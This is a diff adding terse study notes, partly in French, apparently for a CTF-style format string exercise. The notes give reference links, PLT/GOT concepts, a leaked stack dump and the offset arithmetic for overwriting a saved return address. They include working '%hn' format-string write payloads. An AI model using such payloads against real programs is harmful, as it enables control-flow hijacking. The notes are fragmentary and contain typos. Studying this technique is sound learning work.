@@ -1,4 +1,21 @@
 
+https://www.youtube.com/watch?v=iwNYoDw1hW4
+https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/
+https://ctf101.org/binary-exploitation/what-is-the-got/
+
+https://www.youtube.com/watch?v=B4-wVdQo040
+
+Exercice type:
+-> ret2plt
+-> GOT overwrite
+
+Concepts:
+-> Procedure linage table (PLT)
+-> Global offset table GOT
+-> Lazy binding
+
+
+
 -> value for %x %x %x %x %x %x
 200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 a207825
 
@@ -7,3 +24,28 @@
 with arg %x/%p can read stack 
 and with \n (int *) can write on it 
 
+
+- exploit printf vunerability and write data on it 
+
+%134$p
+0xbffff738
+
+overwrite eip of v() (0xbffff738) to 0x080484e4 (condition after if/jump)
+
+%34020x%134$hn%31968x%135$hn
+
+84e4 = 34020
+-8 = 34020 - 8 = 34012
+
+
+0804 = 2052
+-8 = 2044
+
+84e4 > 0804 donc overwrite la partie la plus petite en premier
+
+idx default: 134
+
+CAAAAAAA%2044x%4$hn%31960x%5$hn
+
+
+%16705x%134$hn%135$hn
